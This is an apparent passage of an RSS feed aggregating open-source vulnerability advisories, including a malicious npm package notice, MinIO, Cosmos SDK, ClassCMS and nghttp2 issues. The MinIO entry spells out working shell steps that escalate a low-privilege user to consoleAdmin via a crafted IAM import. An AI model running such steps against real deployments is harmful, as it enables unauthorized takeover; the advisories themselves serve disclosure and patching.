                            <b>References:</b> <ul><li>- <a target='_blank' href='https://npmjs.com/package/windows-version-check'>https://npmjs.com/package/windows-version-check</a></li><li>- <a target='_blank' href='https://socket.dev/blog/skuld-infostealer-returns-to-npm'>https://socket.dev/blog/skuld-infostealer-returns-to-npm</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in windows-version-check (npm)</b><br>
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (613ba7ede540f232f2e844b88d0e3dbdee0806c83dfbf4cf4bf4ca7a5430aa33)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6pfc-w86r-54q6: 5.3 | <b>Welcome and About GeoServer pages communicate version and revision information</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6pfc-w86r-54q6</link>
                    <pubDate>2024-12-16T22:18:29Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6pfc-w86r-54q6'>https://osv.dev/vulnerability/GHSA-6pfc-w86r-54q6</a><br>
                            <b>Published:</b> 2024-12-16T22:18:29Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6'>https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6</a></li><li>- <a target='_blank' href='https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99'>https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99</a></li><li>- <a target='_blank' href='https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8'>https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8</a></li><li>- <a target='_blank' href='https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920'>https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920</a></li><li>- <a target='_blank' href='https://github.com/geoserver/geoserver'>https://github.com/geoserver/geoserver</a></li></ul><br>
                            <b>Details:</b> <b>Welcome and About GeoServer pages communicate version and revision information</b><br>### Impact

The welcome and about page includes version and revision information about the software in use (including library and components used).

This information is sensitive from a security point of view because it allows software used by the server to be easily identified.

### Proof of Concept

1. Welcome page footer: 
   
   &amp;lt;img width=&quot;432&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;geoserver&#x2F;geoserver&#x2F;assets&#x2F;629681&#x2F;a7fd5151-55d5-432b-9d5d-79136833609f&quot;&amp;gt;

2. About page *build information*. 

   &amp;lt;img width=&quot;401&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;geoserver&#x2F;geoserver&#x2F;assets&#x2F;629681&#x2F;59fcd8dd-eaee-4bf8-9578-a2a94b2864db&quot;&amp;gt;

### Patches

No patch presently available.

### Workarounds

No workaround available, although the ADMIN_CONSOLE can be disabled completely.

### References

* [About GeoServer](https:&#x2F;&#x2F;docs.geoserver.org&#x2F;latest&#x2F;en&#x2F;user&#x2F;webadmin&#x2F;about.html)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12666: 8.8 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12666</link>
                    <pubDate>2024-12-16T20:15:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12666'>https://osv.dev/vulnerability/CVE-2024-12666</a><br>
                            <b>Published:</b> 2024-12-16T20:15:09Z<br>
                            <b>Severity:</b> 8.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.288535'>https://vuldb.com/?ctiid.288535</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.288535'>https://vuldb.com/?id.288535</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.461120'>https://vuldb.com/?submit.461120</a></li><li>- <a target='_blank' href='https://github.com/Jack-Black-13/blob/blob/main/ClassCMS%20V4.8%20Vertical%20Privilege%20Escalation.md'>https://github.com/Jack-Black-13/blob/blob/main/ClassCMS%20V4.8%20Vertical%20Privilege%20Escalation.md</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability has been found in ClassCMS up to 4.8 and classified as critical. Affected by this vulnerability is an unknown functionality of the file &#x2F;admin?do=admin:user:editPost of the component User Management Page. The manipulation leads to improper handling of insufficient privileges. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12664: 5.4 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12664</link>
                    <pubDate>2024-12-16T20:15:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12664'>https://osv.dev/vulnerability/CVE-2024-12664</a><br>
                            <b>Published:</b> 2024-12-16T20:15:09Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.288533'>https://vuldb.com/?ctiid.288533</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.288533'>https://vuldb.com/?id.288533</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.458622'>https://vuldb.com/?submit.458622</a></li><li>- <a target='_blank' href='https://github.com/cydtseng/Vulnerability-Research/blob/main/rebuild/StoredXSS-TaskComments.md'>https://github.com/cydtseng/Vulnerability-Research/blob/main/rebuild/StoredXSS-TaskComments.md</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability, which was classified as problematic, has been found in ruifang-tech Rebuild 3.8.5. This issue affects some unknown processing of the component Project Task Comment Handler. The manipulation leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12665: 5.4 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12665</link>
                    <pubDate>2024-12-16T20:15:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12665'>https://osv.dev/vulnerability/CVE-2024-12665</a><br>
                            <b>Published:</b> 2024-12-16T20:15:09Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.288534'>https://vuldb.com/?ctiid.288534</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.288534'>https://vuldb.com/?id.288534</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.458623'>https://vuldb.com/?submit.458623</a></li><li>- <a target='_blank' href='https://github.com/cydtseng/Vulnerability-Research/blob/main/rebuild/StoredXSS-TaskCommentAttachments.md'>https://github.com/cydtseng/Vulnerability-Research/blob/main/rebuild/StoredXSS-TaskCommentAttachments.md</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability, which was classified as problematic, was found in ruifang-tech Rebuild 3.8.5. Affected is an unknown function of the component Task Comment Attachment Upload. The manipulation leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8wcc-m6j2-qxvm: 8.7 | <b>ASA-2024-0012, ASA-2024-0013: CosmosSDK: Transaction decoding may result in a stack overflow or resource exhaustion </b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8wcc-m6j2-qxvm</link>
                    <pubDate>2024-12-16T19:33:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8wcc-m6j2-qxvm'>https://osv.dev/vulnerability/GHSA-8wcc-m6j2-qxvm</a><br>
                            <b>Published:</b> 2024-12-16T19:33:30Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-8wcc-m6j2-qxvm'>https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-8wcc-m6j2-qxvm</a></li><li>- <a target='_blank' href='https://github.com/cosmos/cosmos-sdk/commit/c6b1bdcd5628e3e425a3f02881d3c7db1d7af653'>https://github.com/cosmos/cosmos-sdk/commit/c6b1bdcd5628e3e425a3f02881d3c7db1d7af653</a></li><li>- <a target='_blank' href='https://github.com/cosmos/cosmos-sdk'>https://github.com/cosmos/cosmos-sdk</a></li><li>- <a target='_blank' href='https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.15'>https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.15</a></li><li>- <a target='_blank' href='https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.11'>https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.11</a></li></ul><br>
                            <b>Details:</b> <b>ASA-2024-0012, ASA-2024-0013: CosmosSDK: Transaction decoding may result in a stack overflow or resource exhaustion </b><br>## Summary 

### ASA-2024-0012
Name: ASA-2024-0012,  Transaction decoding may result in a stack overflow
Component: Cosmos SDK
Criticality: High (Considerable Impact, and Possible Likelihood per [ACMv1.2](https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;main&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md))
Affected versions: cosmos-sdk versions &amp;lt;= v0.50.10, &amp;lt;= v0.47.14
Affected users: Chain Builders + Maintainers, Validators, node operators

### ASA-2024-0013
Name: ASA-2024-0013: CosmosSDK: Transaction decoding may result in resource exhaustion  
Component: Cosmos SDK
Criticality: High (Considerable Impact, and Possible Likelihood per [ACMv1.2](https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;main&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md))
Affected versions: cosmos-sdk versions &amp;lt;= v0.50.10, &amp;lt;= v0.47.14
Affected users: Chain Builders + Maintainers, Validators, node operators



### Impact

### ASA-2024-0012

When decoding a maliciously formed packet with a deeply-nested structure, it may be possible for a stack overflow to occur and result in a network halt. This was addressed by adding a recursion limit while decoding the packet.

### ASA-2024-0013

Nested messages in a transaction can consume exponential cpu and memory on `UnpackAny` calls.  The`max_tx_bytes` sets a limit for external TX but is not applied for internal messages emitted by wasm contracts or a malicious validator block. This may result in a node crashing due to resource exhaustion.  This was addressed by adding additional validation to prevent this condition.


### Patches

The issues above are resolved in Cosmos SDK versions v0.47.15 or v0.50.11.
Please upgrade ASAP.

### Timeline for ASA-2024-0012

* October 1, 2024, 12:29pm UTC: Issue reported to the Cosmos Bug Bounty program
* October 1, 2024, 2:47pm UTC: Issue triaged by Amulet on-call, and distributed to Core team
* December 9, 2024, 11:13am UTC: Core team completes patch for issue
* Dec 14, 2024,16:00 UTC: Pre-notification delivered
* Dec 16, 2024, 16:00 UTC: Patch made available

This issue was reported to the Cosmos Bug Bounty Program on HackerOne on October 1, 2024.

### Timeline for ASA-2024-0013

* October 19, 2024, 8:12pm UTC: Issue reported to the Cosmos Bug Bounty program
* October 19, 2024, 8:28pm UTC: Issue triaged by Amulet on-call, and distributed to Core team
* December 11, 2024, 3:31pm UTC: Core team completes patch for issue
* Dec 14, 2024, 16:00 UTC: Pre-notification delivered
* Dec 16, 2024, 16:00 UTC: Patch made available

This issue was reported by LonelySloth to the Cosmos Bug Bounty Program on HackerOne on October 19, 2024. 


If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see https:&#x2F;&#x2F;hackerone.com&#x2F;cosmos.

If you have questions about Interchain security efforts, please reach out to our official communication channel at [security@interchain.io](mailto:security@interchain.io).  For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security.  
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cwq8-g58r-32hg: 7.1 | <b>MinIO vulnerable to privilege escalation in IAM import API</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cwq8-g58r-32hg</link>
                    <pubDate>2024-12-16T17:27:53Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cwq8-g58r-32hg'>https://osv.dev/vulnerability/GHSA-cwq8-g58r-32hg</a><br>
                            <b>Published:</b> 2024-12-16T17:27:53Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/minio/minio/security/advisories/GHSA-cwq8-g58r-32hg'>https://github.com/minio/minio/security/advisories/GHSA-cwq8-g58r-32hg</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/pull/20756'>https://github.com/minio/minio/pull/20756</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/commit/580d9db85e04f1b63cc2909af50f0ed08afa965f'>https://github.com/minio/minio/commit/580d9db85e04f1b63cc2909af50f0ed08afa965f</a></li><li>- <a target='_blank' href='https://github.com/minio/minio/commit/f246c9053f9603e610d98439799bdd2a6b293427'>https://github.com/minio/minio/commit/f246c9053f9603e610d98439799bdd2a6b293427</a></li><li>- <a target='_blank' href='https://github.com/minio/minio'>https://github.com/minio/minio</a></li></ul><br>
                            <b>Details:</b> <b>MinIO vulnerable to privilege escalation in IAM import API</b><br>### Impact
Privilege escalation in IAM import API, all users are impacted since MinIO commit 580d9db85e04f1b63cc2909af50f0ed08afa965f

### Patches
```
commit f246c9053f9603e610d98439799bdd2a6b293427
Author: Aditya Manthramurthy &amp;lt;donatello@users.noreply.github.com&amp;gt;
Date:   Wed Dec 11 18:09:40 2024 -0800

    fix: Privilege escalation in IAM import API (#20756)
    
    This API had missing permissions checking, allowing a user to change
    their policy mapping by:
    
    1. Craft iam-info.zip file: Update own user permission in
    user_mappings.json
    2. Upload it via `mc admin cluster iam import nobody iam-info.zip`
    
    Here `nobody` can be a user with pretty much any kind of permission (but
    not anonymous) and this ends up working.
    
    Some more detailed steps - start from a fresh setup:
    
    ```
    .&#x2F;minio server &#x2F;tmp&#x2F;d{1...4} &amp;
    mc alias set myminio http:&#x2F;&#x2F;localhost:9000 minioadmin minioadmin
    mc admin user add myminio nobody nobody123
    mc admin policy attach myminio readwrite nobody nobody123
    mc alias set nobody http:&#x2F;&#x2F;localhost:9000 nobody nobody123
    
    mc admin cluster iam export myminio
    mkdir &#x2F;tmp&#x2F;x &amp;&amp; mv myminio-iam-info.zip &#x2F;tmp&#x2F;x
    cd &#x2F;tmp&#x2F;x
    unzip myminio-iam-info.zip
    echo &#x27;{&quot;nobody&quot;:{&quot;version&quot;:1,&quot;policy&quot;:&quot;consoleAdmin&quot;,&quot;updatedAt&quot;:&quot;2024-08-13T19:47:10.1Z&quot;}}&#x27; &amp;gt; \
          iam-assets&#x2F;user_mappings.json
    zip -r myminio-iam-info-updated.zip iam-assets&#x2F;
    
    mc admin cluster iam import nobody .&#x2F;myminio-iam-info-updated.zip
    mc admin service restart nobody
    ```
```

### Workarounds
There are no workarounds possible, all users are advised to upgrade immediately if you don&#x27;t run MinIO behind a load balancer.

Behind a load balancer &#x2F; firewall such as `nginx` . 

```
location &#x2F;minio&#x2F;admin&#x2F;v2&#x2F;import-iam {
...
}
```

```
location &#x2F;minio&#x2F;admin&#x2F;v3&#x2F;import-iam-v2 {
...
```

Following locations can be blocked from external access, temporarily disallowing the API calls completely until the deployments can be upgraded.

### References
Refer https:&#x2F;&#x2F;github.com&#x2F;minio&#x2F;minio&#x2F;pull&#x2F;20756 for more information 

### Binary Releases
#### AiStor Containers
```
quay.io&#x2F;minio&#x2F;aistor&#x2F;minio:RELEASE.2024-12-13T13-42-41Z
quay.io&#x2F;minio&#x2F;aistor&#x2F;minio:RELEASE.2024-12-13T13-42-41Z.fips
```

#### AiStor Binaries
#####  Architecture: `linux&#x2F;amd64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;aistor&#x2F;minio&#x2F;release&#x2F;linux-amd64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T13-42-41Z

##### Architecture: `linux&#x2F;arm64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;aistor&#x2F;minio&#x2F;release&#x2F;linux-arm64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T13-42-41Z

##### Architecture: `windows&#x2F;amd64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;aistor&#x2F;minio&#x2F;release&#x2F;windows-amd64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T13-42-41Z

### Community Containers
```
quay.io&#x2F;minio&#x2F;minio:RELEASE.2024-12-13T22-19-12Z
quay.io&#x2F;minio&#x2F;minio:RELEASE.2024-12-13T22-19-12Z.fips
```

### Community Binaries
#####  Architecture: `linux&#x2F;amd64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;server&#x2F;minio&#x2F;release&#x2F;linux-amd64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T22-19-12Z

##### Architecture: `linux&#x2F;arm64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;server&#x2F;minio&#x2F;release&#x2F;linux-arm64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T22-19-12Z

##### Architecture: `windows&#x2F;amd64`
- https:&#x2F;&#x2F;dl.min.io&#x2F;server&#x2F;minio&#x2F;release&#x2F;windows-amd64&#x2F;archive&#x2F;minio.RELEASE.2024-12-13T22-19-12Z

### Credits
Credit goes to [National Security Agency](https:&#x2F;&#x2F;www.nsa.gov&#x2F;) for reporting this issue.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-10531: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-10531</link>
                    <pubDate>2024-12-16T14:07:38.625Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-10531'>https://osv.dev/vulnerability/BIT-node-min-2020-10531</a><br>
                            <b>Published:</b> 2024-12-16T14:07:38.625Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00004.html'>http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00004.html</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2020:0738'>https://access.redhat.com/errata/RHSA-2020:0738</a></li><li>- <a target='_blank' href='https://bugs.chromium.org/p/chromium/issues/detail?id=1044570'>https://bugs.chromium.org/p/chromium/issues/detail?id=1044570</a></li><li>- <a target='_blank' href='https://chromereleases.googleblog.com/2020/02/stable-channel-update-for-desktop_24.html'>https://chromereleases.googleblog.com/2020/02/stable-channel-update-for-desktop_24.html</a></li><li>- <a target='_blank' href='https://chromium.googlesource.com/chromium/deps/icu/+/9f4020916eb1f28f3666f018fdcbe6c9a37f0e08'>https://chromium.googlesource.com/chromium/deps/icu/+/9f4020916eb1f28f3666f018fdcbe6c9a37f0e08</a></li><li>- <a target='_blank' href='https://github.com/unicode-org/icu/commit/b7d08bc04a4296982fcef8b6b8a354a9e4e7afca'>https://github.com/unicode-org/icu/commit/b7d08bc04a4296982fcef8b6b8a354a9e4e7afca</a></li><li>- <a target='_blank' href='https://github.com/unicode-org/icu/pull/971'>https://github.com/unicode-org/icu/pull/971</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2020/03/msg00024.html'>https://lists.debian.org/debian-lts-announce/2020/03/msg00024.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6IOHSO6BUKC6I66J5PZOMAGFVJ66ZS57/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6IOHSO6BUKC6I66J5PZOMAGFVJ66ZS57/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/X3B5RWJQD5LA45MYLLR55KZJOJ5NVZGP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/X3B5RWJQD5LA45MYLLR55KZJOJ5NVZGP/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202003-15'>https://security.gentoo.org/glsa/202003-15</a></li><li>- <a target='_blank' href='https://unicode-org.atlassian.net/browse/ICU-20958'>https://unicode-org.atlassian.net/browse/ICU-20958</a></li><li>- <a target='_blank' href='https://usn.ubuntu.com/4305-1/'>https://usn.ubuntu.com/4305-1/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2020/dsa-4646'>https://www.debian.org/security/2020/dsa-4646</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in International Components for Unicode (ICU) for C&#x2F;C++ through 66.1. An integer overflow, leading to a heap-based buffer overflow, exists in the UnicodeString::doAppend() function in common&#x2F;unistr.cpp.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-11080: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-11080</link>
                    <pubDate>2024-12-16T14:07:31.129Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-11080'>https://osv.dev/vulnerability/BIT-node-min-2020-11080</a><br>
                            <b>Published:</b> 2024-12-16T14:07:31.129Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00024.html'>http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00024.html</a></li><li>- <a target='_blank' href='https://github.com/nghttp2/nghttp2/commit/336a98feb0d56b9ac54e12736b18785c27f75090'>https://github.com/nghttp2/nghttp2/commit/336a98feb0d56b9ac54e12736b18785c27f75090</a></li><li>- <a target='_blank' href='https://github.com/nghttp2/nghttp2/commit/f8da73bd042f810f34d19f9eae02b46d870af394'>https://github.com/nghttp2/nghttp2/commit/f8da73bd042f810f34d19f9eae02b46d870af394</a></li><li>- <a target='_blank' href='https://github.com/nghttp2/nghttp2/security/advisories/GHSA-q5wr-xfw9-q7xr'>https://github.com/nghttp2/nghttp2/security/advisories/GHSA-q5wr-xfw9-q7xr</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/10/msg00011.html'>https://lists.debian.org/debian-lts-announce/2021/10/msg00011.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/10/msg00023.html'>https://lists.debian.org/debian-lts-announce/2023/10/msg00023.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/AAC2AA36OTRHKSVM5OV7TTVB3CZIGEFL/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/AAC2AA36OTRHKSVM5OV7TTVB3CZIGEFL/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2020/dsa-4696'>https://www.debian.org/security/2020/dsa-4696</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2020.html'>https://www.oracle.com/security-alerts/cpujul2020.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2020.html'>https://www.oracle.com/security-alerts/cpuoct2020.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In nghttp2 before version 1.41.0, the overly large HTTP&#x2F;2 SETTINGS frame payload causes denial of service. The proof of concept attack involves a malicious client constructing a SETTINGS frame with a length of 14,400 bytes (2400 individual settings entries) over and over again. The attack causes the CPU to spike at 100%. nghttp2 v1.41.0 fixes this vulnerability. There is a workaround to this vulnerability. Implement nghttp2_on_frame_recv_callback callback, and if received frame is SETTINGS frame and the number of settings entries are large (e.g., &amp;gt; 32), then drop the connection.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-1971: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-1971</link>
                    <pubDate>2024-12-16T14:07:24.524Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-1971'>https://osv.dev/vulnerability/BIT-node-min-2020-1971</a><br>
                            <b>Published:</b> 2024-12-16T14:07:24.524Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/09/14/2'>http://www.openwall.com/lists/oss-security/2021/09/14/2</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=2154ab83e14ede338d2ede9bbe5cdfce5d5a6c9e'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=2154ab83e14ede338d2ede9bbe5cdfce5d5a6c9e</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=f960d81215ebf3f65e03d4d5d857fb9b666d6920'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=f960d81215ebf3f65e03d4d5d857fb9b666d6920</a></li><li>- <a target='_blank' href='https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44676'>https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44676</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/r63c6f2dd363d9b514d0a4bcf624580616a679898cc14c109a49b750c%40%3Cdev.tomcat.apache.org%3E'>https://lists.apache.org/thread.html/r63c6f2dd363d9b514d0a4bcf624580616a679898cc14c109a49b750c%40%3Cdev.tomcat.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/rbb769f771711fb274e0a4acb1b5911c8aab544a6ac5e8c12d40c5143%40%3Ccommits.pulsar.apache.org%3E'>https://lists.apache.org/thread.html/rbb769f771711fb274e0a4acb1b5911c8aab544a6ac5e8c12d40c5143%40%3Ccommits.pulsar.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2020/12/msg00020.html'>https://lists.debian.org/debian-lts-announce/2020/12/msg00020.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2020/12/msg00021.html'>https://lists.debian.org/debian-lts-announce/2020/12/msg00021.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DGSI34Y5LQ5RYXN4M2I5ZQT65LFVDOUU/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DGSI34Y5LQ5RYXN4M2I5ZQT65LFVDOUU/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PWPSSZNZOBJU2YR6Z4TGHXKYW3YP5QG7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PWPSSZNZOBJU2YR6Z4TGHXKYW3YP5QG7/</a></li><li>- <a target='_blank' href='https://security.FreeBSD.org/advisories/FreeBSD-SA-20:33.openssl.asc'>https://security.FreeBSD.org/advisories/FreeBSD-SA-20:33.openssl.asc</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202012-13'>https://security.gentoo.org/glsa/202012-13</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201218-0005/'>https://security.netapp.com/advisory/ntap-20201218-0005/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210513-0002/'>https://security.netapp.com/advisory/ntap-20210513-0002/</a></li><li>- <a target='_blank' 